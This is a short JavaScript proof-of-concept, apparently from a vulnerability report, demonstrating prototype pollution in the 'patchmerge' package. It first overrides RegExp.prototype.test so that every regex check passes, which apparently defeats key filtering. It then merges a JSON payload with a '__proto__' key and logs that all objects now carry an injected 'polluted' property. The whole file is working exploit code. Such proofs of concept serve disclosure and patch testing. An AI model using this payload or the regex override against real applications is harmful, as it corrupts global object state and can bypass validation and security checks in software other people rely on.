RegExp.prototype.test = () => true;
const patchMerge = require('patchmerge');
console.log({}.polluted);
let obj = {};
patchMerge(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);